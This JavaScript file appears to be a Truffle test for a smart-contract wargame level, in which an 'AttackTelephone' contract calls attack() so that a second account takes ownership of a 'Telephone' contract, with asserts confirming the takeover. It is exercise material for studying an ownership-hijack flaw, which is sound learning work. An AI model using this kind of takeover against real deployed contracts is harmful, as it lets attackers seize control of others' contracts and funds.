const Telephone = artifacts.require("Telephone");
const AttackTelephone = artifacts.require("AttackTelephone");
// const Web3 = require("web3");
// const web3 = new Web3(process.env.LOCAL_PROVIDER)

let telephoneInstance
let telephoneAttackInstance

contract('Telephone', (accounts) => {

  before(async () => {

    //telephoneInstance = await new web3.eth.Contract(Telephone.abi, Telephone.address)
    telephoneAttackInstance = await AttackTelephone.deployed()
    telephoneInstance = await Telephone.deployed()
    //telephoneAttackInstance = await new web3.eth.Contract(AttackTelephone.abi, AttackTelephone.address, {from: accounts[1]})
    
  })

  it("owner of Telephone is account 0", async () => {
    let owner = await telephoneInstance.contract.methods.owner().call()
    console.log("telephone owner: ", owner);
    assert.equal(owner, accounts[0], "Telephone owner is not correct")
  })

  it("owner of TelephoneAttack is account 1", async () => {
    let owner = await telephoneAttackInstance.contract.methods.owner().call()
    console.log("TelephoneAttack owner: ", owner);
    assert.equal(owner, accounts[1], "TelephoneAttack owner is not correct")
  })

  it("account 1 takes ownership of Telephone", async () => {
    await telephoneAttackInstance.contract.methods.attack().send({from: accounts[1]})
    let owner = await telephoneInstance.contract.methods.owner().call()
    console.log("telephone owner: ", owner);
    assert.equal(owner, accounts[1], "hacking was unsuccesfull")
  })
})